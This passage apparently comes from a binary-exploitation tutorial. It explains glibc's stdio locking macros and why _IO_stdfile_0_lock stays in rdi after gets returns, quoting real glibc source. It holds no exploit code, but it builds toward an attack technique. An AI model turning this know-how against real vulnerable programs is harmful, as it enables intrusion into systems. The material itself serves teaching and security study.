punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">owner</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> _IO_lock_t</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sidenote-on-finding-locking-functions">Sidenote on finding locking functions<a href="#sidenote-on-finding-locking-functions" class="hash-link" aria-label="Direct link to Sidenote on finding locking functions" title="Direct link to Sidenote on finding locking functions">​</a></h3>
<p>I had some trouble finding the necessary macros and functions for acquiring and releasing locks, so I&#x27;ll make a note here. I use <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source" target="_blank" rel="noopener noreferrer">elixir bootlin</a> for reading and searching the glibc code base. When <a href="https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_IO_acquire_lock" target="_blank" rel="noopener noreferrer">searching</a> for <code>_IO_acquire_lock</code>, we get multiple definitions, which isn&#x27;t very helpful (same thing for <code>_IO_release_lock</code>).</p>
<p> <img decoding="async" loading="lazy" src="/assets/images/image (122)-5bcf327587c4d249c5951e18434292cc.png" width="341" height="179" class="img_ev3q"></p>
<p>So which one gets used?</p>
<ul>
<li><code>sysdeps/htl</code>: This is the <code>Hurd version</code>, which would be used on <a href="https://www.gnu.org/software/hurd/" target="_blank" rel="noopener noreferrer">GNU Hurd</a>. This isn&#x27;t nearly as common as <code>GNU Linux</code>, so we can ignore this one.</li>
<li><code>sysdeps/generic</code>: Like the name suggests, this is designed to work anywhere which doesn&#x27;t have a specific definition, like a fallback. This isn&#x27;t used in our case.</li>
<li><code>libio/libioP.h</code>: Seems to be <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L887" target="_blank" rel="noopener noreferrer">another fallback</a>, in a specific case at least, when <code>_IO_MTSAFE_IO</code> isn&#x27;t defined. If these were used, no locking is done at all, so this implies this is when we don&#x27;t care about thread safety.<br>
<!-- -->In our case <code>_IO_MTSAFE_IO</code> is set, so we can ignore this.</li>
</ul>
<p>The correct one is <code>sysdeps/nptl</code>, otherwise known as <code>Native POSIX Threads Library</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="_io_acquire_lock_io_release_lock"><code>_IO_acquire_lock</code>/<code>_IO_release_lock</code><a href="#_io_acquire_lock_io_release_lock" class="hash-link" aria-label="Direct link to _io_acquire_lock_io_release_lock" title="Direct link to _io_acquire_lock_io_release_lock">​</a></h3>
<p>These macros are <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88" target="_blank" rel="noopener noreferrer">defined</a> as follows:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_acquire_lock</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">do</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression" style="color:#36acaa">FILE </span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression" style="color:#36acaa">_IO_acquire_lock_file						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression keyword" style="color:#00009f">__attribute__</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression function" style="color:#d73a49">cleanup</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_IO_acquire_lock_fct</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">			      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">							      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression function" style="color:#d73a49">_IO_flockfile</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_IO_acquire_lock_file</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property directive keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#  </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property directive keyword" style="color:#00009f">endif</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_release_lock</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">while</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>This may look confusing, but the 2 important functions to take away from this are <code>_IO_flockfile</code> and <code>_IO_acquire_lock_fct</code>. The <code>__attribute__((cleanup))</code> maybe look bizarre, but all it does is call <code>_IO_acquire_lock_fct</code> on <code>_fp</code> when the end of the artificial <code>do-while(0)</code> block is over (basically at the end of the IO function). <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L880" target="_blank" rel="noopener noreferrer">_IO_acquire_lock_fct</a> is defined as:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">inline</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">__attribute__</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">__always_inline__</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">_IO_acquire_lock_fct</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">FILE </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  FILE </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">fp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">_flags </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> _IO_USER_LOCK</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">_IO_funlockfile</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>So really from this, the 2 macros for locking and unlocking are <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L282" target="_blank" rel="noopener noreferrer">_IO_flockfile</a> and <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L284" target="_blank" rel="noopener noreferrer">_IO_funlockfile</a>.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_flockfile</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression operator" style="color:#393A34">-&gt;</span><span class="token macro property expression" style="color:#36acaa">_flags </span><span class="token macro property expression operator" style="color:#393A34">&amp;</span><span class="token macro property expression" style="color:#36acaa"> _IO_USER_LOCK</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">_IO_lock_lock</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression operator" style="color:#393A34">-&gt;</span><span class="token macro property expression" style="color:#36acaa">_lock</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_funlockfile</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression operator" style="color:#393A34">-&gt;</span><span class="token macro property expression" style="color:#36acaa">_flags </span><span class="token macro property expression operator" style="color:#393A34">&amp;</span><span class="token macro property expression" style="color:#36acaa"> _IO_USER_LOCK</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">_IO_lock_unlock</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_fp</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression operator" style="color:#393A34">-&gt;</span><span class="token macro property expression" style="color:#36acaa">_lock</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><code>_IO_USER_LOCK=0x8000</code> is a macro which seems to indicate whether or not the inbuilt locking should be used or not. This is usually used internally, like in helper streams in <code>printf</code> for example. For our purposes we can ignore this, as this check will always pass for <code>stdin</code> (or any of the standard streams for that matter). Finally we get to the macros that we care about: <code>_IO_lock_lock</code> and <code>_IO_lock_unlock</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="_io_lock_lock_io_lock_unlock"><code>_IO_lock_lock</code>/<code>_IO_lock_unlock</code><a href="#_io_lock_lock_io_lock_unlock" class="hash-link" aria-label="Direct link to _io_lock_lock_io_lock_unlock" title="Direct link to _io_lock_lock_io_lock_unlock">​</a></h3>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L37" target="_blank" rel="noopener noreferrer">_IO_lock_lock</a> and <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67" target="_blank" rel="noopener noreferrer">_IO_lock_unlock</a> are defined as:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_lock_lock</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">do</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">void</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression" style="color:#36acaa">__self </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> THREAD_SELF</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">!=</span><span class="token macro property expression" style="color:#36acaa"> __self</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">					      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression function" style="color:#d73a49">lll_lock</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">lock</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> LLL_PRIVATE</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">        </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> __self</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression operator" style="color:#393A34">++</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">cnt</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">							      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">while</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_lock_unlock</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">do</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression operator" style="color:#393A34">--</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">cnt </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">        </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression constant" style="color:#36acaa">NULL</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression function" style="color:#d73a49">lll_unlock</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">lock</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> LLL_PRIVATE</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">while</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Note that <code>_name</code> is the lock itself, and in the case of <code>gets</code>, is <code>_IO_stdfile_0_lock</code>.</p>
<p>Let&#x27;s break this down. The <code>owner</code> field stores the address of <code>TLS</code> (Thread Local Storage) structure for the thread currently using the lock (if you&#x27;re wondering what the <code>TLS</code> structure is, it&#x27;s the structure whose address is stored in the <code>fs</code> register; it also stores the canary, and you&#x27;ve likely seen <code>fs:[0x28]</code> in disassembly). So when locking, if the <code>owner</code> is different to <code>THREAD_SELF</code> (i.e. lock is owned by a different thread), it waits until that thread has <em>unlocked</em> using <code>lll_lock</code>, then claims ownership of the lock. When unlocking, it removes its ownership, and signals that it&#x27;s no longer in use with <code>lll_unlock</code>.</p>
<p>The use of <code>cnt</code> is a bit bizarre to me. The only way I could see this being useful is if the same thread had to use the lock multiple times, perhaps due to recursive(?) calls. Perhaps it&#x27;s just a flexibility thing, I&#x27;m not sure. But what I can tell you is that this will be useful for us in a moment ;)</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="_io_stdfile_0_lock-in-rdi"><code>_IO_stdfile_0_lock</code> in <code>rdi</code>?<a href="#_io_stdfile_0_lock-in-rdi" class="hash-link" aria-label="Direct link to _io_stdfile_0_lock-in-rdi" title="Direct link to _io_stdfile_0_lock-in-rdi">​</a></h3>
<p>You may be wondering why this happens, and while this is slightly bizarre, I can give an educated guess.</p>
<p>For one thing, <code>_IO_lock_unlock</code> is what&#x27;s called at the very end of most IO functions, including <code>gets</code>, so its effects on the registers are the most recent before returning, with nothing afterwards clobbering the registers.</p>
<figure><img src="/assets/image (123).png" alt=""><figcaption><p><code>gets+131</code></p></figcaption></figure>
<figure><img src="/assets/image (124).png" alt=""><figcaption><p><code>_IO_lock_unlock</code></p></figcaption></figure>
